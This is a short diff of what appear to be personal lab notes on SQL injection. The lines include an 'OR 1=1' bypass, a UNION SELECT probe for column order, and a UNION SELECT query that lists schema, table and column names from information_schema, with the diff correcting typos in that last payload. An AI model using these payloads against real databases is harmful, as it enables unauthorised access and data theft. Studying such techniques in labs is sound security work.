@@ -43,5 +43,5 @@ delete end
 OR 1=1
 find vulnerable selection
 Selection=2 UNION SELECT 1,2,3 (table came back as 1,3,2, KEEP IN MIND)
-2 UNION SELECT table_schema,columnname,table_name FROM information_schema.colums
+2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
 
